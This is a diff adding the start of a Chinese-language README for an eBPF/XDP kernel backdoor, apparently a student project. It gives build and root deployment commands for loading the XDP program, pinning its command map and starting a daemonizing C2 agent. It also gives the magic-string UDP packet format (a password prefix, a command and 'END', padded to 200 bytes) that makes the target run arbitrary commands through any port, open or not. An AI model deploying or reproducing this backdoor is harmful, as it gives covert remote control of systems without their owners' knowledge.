@@ -1,3 +1,45 @@
+# XPD后门
+
+## 说明
+这是无开放端口的XDP后门，是毕业设计的一部分
+
+## 部署
+```bash
+# 编译
+make
+
+# 如果需要c2 server的话，使用下面命令编译，如果使用网页演示，通常不需要编译。
+gcc c2_server.c -o c2_server -pthread
+
+# 加载XDP程序
+
+# Load into kernel
+sudo ip link set dev eth0 xdp obj xdp_blackdoor.o sec xdp
+
+# Pin the map to filesystem
+sudo bpftool map pin name commands /sys/fs/bpf/blackdoor_commands
+
+# Verify loaded
+sudo bpftool prog show
+
+
+# 开启用户空间命令执行agent
+
+sudo ./c2_agent /sys/fs/bpf/blackdoor_commands
+# Agent will daemonize - check with ps aux | grep c2_agent
+
+```
+
+## 部署后
+
+向目标机器80端口发送数据字段为 Phantom2025!lsEND 格式的UDP数据包。
+理论上是任何端口，无论是否开放。但是该端口必须未被云服务器提供商所拦截    
+保证data字段的长度是200字节。  
+命令前增加 & 会告知服务器创建一个线程来执行可能被阻塞的命令。  
+目标机器会执行其中包含的任意指令
+
+
+
 # Complete C2 System Deployment Guide
 
 ## Architecture Overview
